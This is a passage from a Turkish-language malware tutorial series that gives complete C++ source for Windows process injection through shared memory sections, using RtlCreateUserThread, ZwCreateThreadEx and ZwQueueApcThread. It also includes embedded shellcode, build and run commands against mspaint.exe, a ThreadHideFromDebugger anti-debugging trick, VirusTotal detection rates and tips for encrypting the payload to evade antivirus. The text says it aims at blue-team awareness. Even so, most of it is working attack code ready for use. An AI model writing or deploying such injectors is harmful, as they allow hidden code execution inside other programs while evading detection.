		"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
		"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
		"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
		"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
		"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
		"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
		"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
		"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
		"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
		"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
		"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
		"\x2e\x2e\x5e\x3d\x00";

	SIZE_T s = 4096;
	LARGE_INTEGER sectionS = { s };
	HANDLE sh = NULL; // section handle
	PVOID lb = NULL; // local buffer
	PVOID rb = NULL; // remote buffer
	HANDLE th = NULL; // thread handle
	DWORD pid; // process ID

	pid = findMyProc(argv[1]);

	OBJECT_ATTRIBUTES oa;
	CLIENT_ID cid;
	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
	cid.UniqueProcess = (PVOID) pid;
	cid.UniqueThread = 0;

	// loading ntdll.dll
	HANDLE ntdll = GetModuleHandleA("ntdll");

	pNtOpenProcess myNtOpenProcess =
	(pNtOpenProcess)GetProcAddress(
		ntdll, "NtOpenProcess");
	pNtCreateSection myNtCreateSection =
	(pNtCreateSection)(GetProcAddress(
		ntdll, "NtCreateSection"));
	pNtMapViewOfSection myNtMapViewOfSection =
	(pNtMapViewOfSection)(GetProcAddress(
		ntdll, "NtMapViewOfSection"));
	pRtlCreateUserThread myRtlCreateUserThread =
	(pRtlCreateUserThread)(GetProcAddress(
		ntdll, "RtlCreateUserThread"));
	pZwUnmapViewOfSection myZwUnmapViewOfSection =
	(pZwUnmapViewOfSection)(GetProcAddress(
		ntdll, "ZwUnmapViewOfSection"));

	// create a memory section
	myNtCreateSection(&sh,
	SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
	NULL, (PLARGE_INTEGER)&sectionS,
	PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	// bind the object in the memory
	// of our process for reading and writing
	myNtMapViewOfSection(sh, GetCurrentProcess(),
	&lb, NULL, NULL, NULL,
	&s, 2, NULL, PAGE_READWRITE);

	// open remote proces via NT API
	HANDLE ph = NULL;
	myNtOpenProcess(&ph, PROCESS_ALL_ACCESS, &oa, &cid);

	if (!ph) {
		printf("failed to open process :(\n");
		return-2;
	}

	// bind the object in the memory of the target process
	// for reading and executing
	myNtMapViewOfSection(sh, ph, &rb, NULL, NULL, NULL,
	&s, 2, NULL, PAGE_EXECUTE_READ);

	// write payload
	memcpy(lb, my_payload, sizeof(my_payload));

	// create a thread
	myRtlCreateUserThread(ph, NULL, FALSE,
	0, 0, 0, rb, NULL, &th, NULL);
	// and wait
	if (WaitForSingleObject(th, INFINITE) == WAIT_FAILED) {
		return-2;
	}
	// clean up
	myZwUnmapViewOfSection(GetCurrentProcess(), lb);
	myZwUnmapViewOfSection(ph, rb);
	CloseHandle(sh);
	CloseHandle(ph);
	return 0;
}

Gördüğünüz gibi, her şey basit. Ayrıca, önceki bölümlerimden biri olan `findMyProc` işlevini kullandım:
+++++++++++++++++++

Bölümün yerel görünümündeki değişiklikler, uzak görünümleri de değiştirecektir. Bu nedenle, zararlı kodu uzak süreç adres alanına yazmak için `KERNEL32.DLL!WriteProcessMemory` gibi API'lere ihtiyaç duyulmaz.

Bu, `NtAllocateVirtualMemory` kullanılarak doğrudan sanal bellek ayırma işlemlerine göre bir avantaj sağlasa da, mavi takım üyelerinin dikkat etmesi gereken benzer zararlı bellek izleri oluşturur.
+++++++++++++++++++

Demo

Son olarak, zararlı yazılımımızın tüm kodunu anladıktan sonra, bunu test edebiliriz.

Zararlı yazılımımızı derleyelim:
x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptionsections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-igc-plibgcc -fpermissive

+++++++++++++++++++

Sonra her şeyi eylemde görelim! Kurban süreci (bizim durumumuzda mspaint.exe) kurban makinede başlatın (Windows 10 x64):
+++++++++++++++++++

Ardından zararlı yazılımımızı çalıştırın:
.\hack.exe mspaint.exe
+++++++++++++++++++
+++++++++++++++++++

Her şeyin mükemmel bir şekilde tamamlandığını görebiliriz :)

Şimdi zararlı yazılımımızı VirusTotal'a yükleyelim:
+++++++++++++++++++
https://www.virustotal.com/gui/file/1573a7d59de744b0723e83539ad8dcb9347c89f2
7a8321ea578c8c0d98f1e2cb?nocache=1

62 antivirüs motorundan 4'ü dosyamızı zararlı olarak algıladı.

Daha iyi sonuçlar için, payload şifrelemesini bir anahtar ile ekleyebilir, işlevleri gizleyebilir veya her iki tekniği birleştirebilirsiniz.

Umarım bu yazı, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.

BlackHat USA 2019 Process Injection Techniques - Gotta Catch Them All(https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All.pdf)
WinDBG kernel debugging(https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/performing-local-kernel-debugging)
NtOpenProcess(https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess)
NtCreateSection(http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtCreateSection.html)
NtMapViewOfSection(http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html)
ZwUnmapViewOfSection(https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwunmapviewofsection)
Moneta64.exe(https://github.com/forrest-orr/moneta)
Github’taki kaynak kod: https://github.com/cocomelonc/2021-12-13-malware-injection-12



25. ZwCreateSection ile Kod Enjeksiyonu. Basit C++ Zararlı Yazılım Örneği."
Bismillah
+++++++++++++++++++

Bir önceki bölümde, bellek bölümleri üzerinden kod enjeksiyonundan bahsetmiştim.
Bu bölüm, bazı Nt öneklerini Zw önekleriyle değiştirme üzerine yaptığım kendi araştırmaların bir sonucudur."
Zw  Öneki Nedir?
Nt  öneki, Windows NT'nin bir kısaltmasıdır, ancak Zw önekinin herhangi bir anlamı yoktur.MSDN'ye göre:

Bir kullanıcı modu uygulaması, yerel bir sistem hizmet rutinine ait Nt  veya Zw sürümünü çağırdığında, rutin her zaman aldığı parametreleri güvenilir olmayan bir kullanıcı modu kaynağından gelen değerler olarak değerlendirir. Rutin, parametre değerlerini kullanmadan önce bu değerleri dikkatlice doğrular. Özellikle, rutin, arayanın sağladığı tamponları kontrol eder ve tamponların geçerli bir kullanıcı modu belleğinde yer aldığından ve düzgün bir şekilde hizalandığından emin olur.
Pratik Örnek. C++ Zararlı Yazılım.
Hadi, önceki gönderi örneğindeki bazı NT API işlevlerini Zw  önekli işlevlerle değiştirelim.
İlk yapılması gereken şey, CreateProcessA ile geçerli bir süreç oluşturmaktır:


BOOL CreateProcessA(
	[in, optional] LPCSTR lpApplicationName,
	[in, out, optional] LPSTR lpCommandLine,
	[in, optional] LPSECURITY_ATTRIBUTES lpProcessAttributes,
	[in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes,
	[in] BOOL bInheritHandles,
	[in] DWORD dwCreationFlags,
	[in, optional] LPVOID lpEnvironment,
	[in, optional] LPCSTR lpCurrentDirectory,
	[in] LPSTARTUPINFOA lpStartupInfo,
	[out] LPPROCESS_INFORMATION lpProcessInformation
);
+++++++++++++++++++

Sonraki adımlar önceki gönderiye benzer, ancak tek
fark, ZwCreateThreadEx kullanmamızdır:

typedef NTSTATUS(NTAPI* pZwCreateThreadEx)(
	_Out_ PHANDLE ThreadHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_ HANDLE ProcessHandle,
	_In_ PVOID StartRoutine,
	_In_opt_ PVOID Argument,
	_In_ ULONG CreateFlags,
	_In_opt_ ULONG_PTR ZeroBits,
	_In_opt_ SIZE_T StackSize,
	_In_opt_ SIZE_T MaximumStackSize,
	_In_opt_ PVOID AttributeList
);
+++++++++++++++++++

Payload'u tetiklemek için RtlCreateUserThread yerine ZwCreateThreadEx kullandık.
Ve bir diğer fark, tutamakları kapatmak (temizleme) için ZwClose kullandık:

typedef NTSTATUS(NTAPI* pZwClose)(
	_In_ HANDLE Handle
);
+++++++++++++++++++

Yani, örnek zararlı yazılımımızın tam kaynak kodu şu şekilde:
/*
	* hack.cpp - code injection via
	* ZwCreateSection, ZwUnmapViewOfSection
	* @cocomelonc
	* https://cocomelonc.github.io/tutorial/
	2022/01/14/malware-injection-13.html
*/
#include <cstdio>
#include <windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll")

// ZwCreateSection
typedef NTSTATUS(NTAPI* pZwCreateSection)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL
);

// NtMapViewOfSection syntax
typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect
);

// ZwCreateThreadEx
typedef NTSTATUS(NTAPI* pZwCreateThreadEx)(
	_Out_ PHANDLE ThreadHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_ HANDLE ProcessHandle,
	_In_ PVOID StartRoutine,
	_In_opt_ PVOID Argument,
	_In_ ULONG CreateFlags,
	_In_opt_ ULONG_PTR ZeroBits,
	_In_opt_ SIZE_T StackSize,
	_In_opt_ SIZE_T MaximumStackSize,
	_In_opt_ PVOID AttributeList
);
// ZwUnmapViewOfSection syntax
typedef NTSTATUS(NTAPI* pZwUnmapViewOfSection)(
	HANDLE ProcessHandle,
	PVOID BaseAddress
);

// ZwClose
typedef NTSTATUS(NTAPI* pZwClose)(
	_In_ HANDLE Handle
);
unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
int main(int argc, char* argv[]) {
	HANDLE sh; // section handle
	HANDLE th; // thread handle
	STARTUPINFOA si = {};
	PROCESS_INFORMATION pi = {};
	PROCESS_BASIC_INFORMATION pbi = {};
	OBJECT_ATTRIBUTES oa;
	SIZE_T s = 4096;
	LARGE_INTEGER sectionS = { s };
	PVOID rb = NULL; // remote buffer
	PVOID lb = NULL; // local buffer

	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&pbi, sizeof(PROCESS_BASIC_INFORMATION));
	si.cb = sizeof(STARTUPINFO);

	ZeroMemory(&oa, sizeof(OBJECT_ATTRIBUTES));

	HMODULE ntdll = GetModuleHandleA("ntdll");
	pZwCreateSection myZwCreateSection =
	(pZwCreateSection)(GetProcAddress(
		ntdll, "ZwCreateSection"));
	pNtMapViewOfSection myNtMapViewOfSection =
	(pNtMapViewOfSection)(GetProcAddress(
		ntdll, "NtMapViewOfSection"));
	pZwUnmapViewOfSection myZwUnmapViewOfSection =
	(pZwUnmapViewOfSection)(GetProcAddress(
		ntdll, "ZwUnmapViewOfSection"));
	pZwCreateThreadEx myZwCreateThreadEx =
	(pZwCreateThreadEx)GetProcAddress(
		ntdll, "ZwCreateThreadEx");
	pZwClose myZwClose =
	(pZwClose)GetProcAddress(
		ntdll, "ZwClose");

	// create process as suspended
	if (!CreateProcessA(NULL,
	(LPSTR) "C:\\windows\\system32\\mspaint.exe",
	NULL, NULL, NULL,
	CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
	NULL, NULL, &si, &pi)) {
		printf("create process failed :(\n");
		return-2;
	};
	myZwCreateSection(&sh,
	SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
	NULL, &sectionS, PAGE_EXECUTE_READWRITE,
	SEC_COMMIT, NULL);
	printf("section handle: %p.\n", sh);

	// mapping the section into current process
	myNtMapViewOfSection(sh, GetCurrentProcess(), &lb,
	NULL, NULL, NULL,
	&s, 2, NULL, PAGE_EXECUTE_READWRITE);
	printf("local process mapped at address: %p.\n", lb);

	// mapping the section into remote process
	myNtMapViewOfSection(sh, pi.hProcess, &rb,
	NULL, NULL, NULL,
	&s, 2, NULL, PAGE_EXECUTE_READWRITE);
	printf("remote process mapped at address: %p\n", rb);

	// copy payload
	memcpy(lb, my_payload, sizeof(my_payload));

	// unmapping section from current process
	myZwUnmapViewOfSection(GetCurrentProcess(), lb);
	printf("mapped at address: %p.\n", lb);
	myZwClose(sh);

	sh = NULL;

	// create new thread
	myZwCreateThreadEx(&th, 0x1FFFFF, NULL, pi.hProcess,
	rb, NULL, CREATE_SUSPENDED, 0, 0, 0, 0);
	printf("thread: %p.\n", th);
	ResumeThread(pi.hThread);
	myZwClose(pi.hThread);
	myZwClose(th);

	return 0;
}

Demo

Zararlı yazılımımızı derleyelim:

x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive

+++++++++++++++++++++++++++++++++++++++++
Şimdi her şeyi eylemde görelim! Bizim durumumuzda, kurban makine Windows 10 x64:
++++++++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++++++++

Her şeyin mükemmel bir şekilde tamamlandığını görebiliyoruz :)
Şimdi, zararlı yazılımımızı VirusTotal'a yükleyelim:
++++++++++++++++++++++++++++++++++++++++++
https://www.virustotal.com/gui/file/cca1a55dd587cb3e6b4768e6d4febe2966741063
e6beac5951f119bf2ba193ae/detection

Sonuç olarak, 67 antivirüs motorundan 5 tanesi dosyamızı zararlı olarak algıladı.
Moneta64.exe sonucu:
++++++++++++++++++++++++++++++++++++++++++

Daha iyi sonuçlar için, istersek payload'u bir anahtarla şifreleyebilir, işlevleri gizleyebilir ya da bu iki tekniği birleştirebiliriz.
Umarım bu yazı, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.
CreateProcessA(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa?redirectedfrom=MSDN)
ZwCreateSection(https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatesection)
NtMapViewOfSection(http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html)
ZwUnmapViewOfSection(https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwunmapviewofsection)
ZwClose(https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwclose)
Moneta64.exe(https://github.com/forrest-orr/moneta)
Github’taki kaynak kod: https://github.com/cocomelonc/2022-01-14-malware-injection-13



26. Memory Sections ve ZwQueueApcThread ile Kod Enjeksiyonu. Basit C++ Zararlı Yazılım Örneği.
﷽
+++++++++++++++++++++++++++++++++++++++++++++
Bir önceki bölümde, bellek bölümleri ile kod enjeksiyonundan bahsetmiştim.
Bu bölüm, iş parçacığı oluşturma mantığını değiştirme üzerine yapılan bir çalışmanın sonucudur.
ZwQueueApcThread
Kullanıcı modu kodu için ZwQueueApcThread ve NtQueueApcThread işlevleri arasında bir fark yoktur. Bu, sadece hangi öneki tercih ettiğinizle ilgilidir.
Yerel işlev ZwQueueApcThread şu şekilde tanımlanmıştır:
NTSYSAPI
NTSTATUS
NTAPI
ZwQueueApcThread(
	IN HANDLE ThreadHandle,
	IN PIO_APC_ROUTINE ApcRoutine,
	IN PVOID ApcRoutineContext OPTIONAL,
	IN PIO_STATUS_BLOCK ApcStatusBlock OPTIONAL,
	IN ULONG ApcReserved OPTIONAL );

Yani, kodumuzda ZwQueueApcThread için bir işlev işaretçisi kullanıyoruz:

typedef NTSTATUS(NTAPI* pZwQueueApcThread)(
	IN HANDLE ThreadHandle,
	IN PIO_APC_ROUTINE ApcRoutine,
	IN PVOID ApcRoutineContext OPTIONAL,
	IN PIO_STATUS_BLOCK ApcStatusBlock OPTIONAL,
	IN ULONG ApcReserved OPTIONAL
);
ZwSetInformationThread
Yerel işlev ZwSetInformationThread şu şekilde tanımlanmıştır:
NTSYSAPI NTSTATUS ZwSetInformationThread(
	[in] HANDLE ThreadHandle,
	[in] THREADINFOCLASS ThreadInformationClass,
	[in] PVOID ThreadInformation,
	[in] ULONG ThreadInformationLength
);

Sonrasında, kodumuzda ZwSetInformationThread için bir işlev işaretçisi kullanıyoruz:

typedef NTSTATUS(NTAPI* pZwSetInformationThread)(
	[in] HANDLE ThreadHandle,
	[in] THREADINFOCLASS ThreadInformationClass,
	[in] PVOID ThreadInformation,
	[in] ULONG ThreadInformationLength
);

Pratik Örnek
Örneğimin mantığı bir önceki bölüme benzer, tek fark şudur:
++++++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, payload başlatma mantığını değiştirdim.
ZwSetInformationThread ile ilgili ilginç bir nokta var. Bu işlevin ikinci parametresi, THREADINFOCLASS yapısıdır, bu bir enum türüdür. Bu yapının son etiketi ThreadHideFromDebugger'dır.Bir iş parçacığı için ThreadHideFromDebugger ayarlandığında, iş parçacığının hata ayıklama olayları oluşturması yasaklanır. Bu, Windows tarafından tersine mühendisliği önlemek için sağlanan ilk anti-debugging tekniklerinden biridir ve oldukça güçlüdür.

Zararlı yazılımın tam kaynak kodu:
/*
	* hack.cpp - code injection via
	* ZwCreateSection, ZwUnmapViewOfSection,
	* ZwQueueApcThread
	* @cocomelonc
	* https://cocomelonc.github.io/tutorial/
	2022/01/17/malware-injection-14.html
*/
#include <cstdio>
#include <windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll")

// ZwCreateSection
typedef NTSTATUS(NTAPI* pZwCreateSection)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL
);

// NtMapViewOfSection syntax
typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect
);

// ZwUnmapViewOfSection syntax
typedef NTSTATUS(NTAPI* pZwUnmapViewOfSection)(
	HANDLE ProcessHandle,
	PVOID BaseAddress
);

// ZwClose
typedef NTSTATUS(NTAPI* pZwClose)(
	_In_ HANDLE Handle
);

// ZwQueueApcThread
typedef NTSTATUS(NTAPI* pZwQueueApcThread)(
	IN HANDLE ThreadHandle,
	IN PIO_APC_ROUTINE ApcRoutine,
	IN PVOID ApcRoutineContext OPTIONAL,
	IN PIO_STATUS_BLOCK ApcStatusBlock OPTIONAL,
	IN ULONG ApcReserved OPTIONAL
);

// ZwSetInformationThread
typedef NTSTATUS(NTAPI* pZwSetInformationThread)(
	_In_ HANDLE ThreadHandle,
	_In_ THREADINFOCLASS ThreadInformationClass,
	_In_ PVOID ThreadInformation,
	_In_ ULONG ThreadInformationLength
);
	
unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";

int main(int argc, char* argv[]) {
	HANDLE sh; // section handle
	HANDLE th; // thread handle
	STARTUPINFOA si = {};
	PROCESS_INFORMATION pi = {};
	PROCESS_BASIC_INFORMATION pbi = {};
	OBJECT_ATTRIBUTES oa;
	SIZE_T s = 4096;
	LARGE_INTEGER sectionS = { (DWORD) s };
	PVOID rb = NULL; // remote buffer
	PVOID lb = NULL; // local buffer

	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&pbi, sizeof(PROCESS_BASIC_INFORMATION));
	si.cb = sizeof(STARTUPINFO);

	ZeroMemory(&oa, sizeof(OBJECT_ATTRIBUTES));

	HMODULE ntdll = GetModuleHandleA("ntdll");
	pZwCreateSection myZwCreateSection =
	(pZwCreateSection)(GetProcAddress(
		ntdll, "ZwCreateSection"));
	pNtMapViewOfSection myNtMapViewOfSection =
	(pNtMapViewOfSection)(GetProcAddress(
		ntdll, "NtMapViewOfSection"));
	pZwUnmapViewOfSection myZwUnmapViewOfSection =
	(pZwUnmapViewOfSection)(GetProcAddress(
		ntdll, "ZwUnmapViewOfSection"));
	pZwQueueApcThread myZwQueueApcThread =
	(pZwQueueApcThread)GetProcAddress(
		ntdll, "ZwQueueApcThread");
	pZwSetInformationThread myZwSetInformationThread =
	(pZwSetInformationThread)GetProcAddress(
		ntdll, "ZwSetInformationThread");
	pZwClose myZwClose =
	(pZwClose)GetProcAddress(
		ntdll, "ZwClose");

	// create process as suspended
	if (!CreateProcessA(NULL,
	(LPSTR) "C:\\windows\\system32\\mspaint.exe",
	NULL, NULL, NULL,
	CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
	NULL, NULL, &si, &pi)) {
		printf("create process failed :(\n");
		return-2;
	};

	myZwCreateSection(&sh,
	SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
	NULL, &sectionS,
	PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	printf("section handle: %p.\n", sh);

	// mapping the section into current process
	myNtMapViewOfSection(sh, GetCurrentProcess(), &lb,
	NULL, NULL, NULL,
	&s, 2, NULL, PAGE_EXECUTE_READWRITE);
	printf("local process mapped at address: %p.\n", lb);

	// mapping the section into remote process
	myNtMapViewOfSection(sh, pi.hProcess, &rb,
	NULL, NULL, NULL,
	&s, 2, NULL, PAGE_EXECUTE_READWRITE);
	printf("remote process mapped at address: %p\n", rb);

	// copy payload
	memcpy(lb, my_payload, sizeof(my_payload));

	// unmapping section from current process
	myZwUnmapViewOfSection(GetCurrentProcess(), lb);
	printf("mapped at address: %p.\n", lb);
	myZwClose(sh);

	sh = NULL;

	// create new thread
	myZwQueueApcThread(pi.hThread, (PIO_APC_ROUTINE)rb, 0, 0, 0);
	myZwSetInformationThread(pi.hThread, (THREADINFOCLASS)1,
	NULL, NULL);
	ResumeThread(pi.hThread);
	myZwClose(pi.hThread);
	myZwClose(th);

	return 0;
}

Her zamanki gibi, basitlik adına, payload olarak meow-meow mesaj kutusunu kullandım:

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
